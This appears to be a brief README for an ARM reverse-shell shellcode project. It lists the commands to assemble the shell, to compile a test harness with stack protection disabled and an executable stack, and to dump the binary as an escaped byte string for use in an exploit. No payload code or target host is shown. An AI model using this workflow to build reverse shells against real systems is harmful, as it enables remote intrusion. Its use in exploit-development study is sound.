# arm_reverse_shell

as reverse_shell.s -o reverse_shell.o && ld -N reverse_shell.o -o reverse_shell  
gcc -fno-stack-protector -z execstack -o shell shell.c  
  
objcopy -O binary reverse_shell reverse_shell.bin  
hexdump -v -e '"\\""x" 1/1 "%02x" ""' reverse_shell.bin  
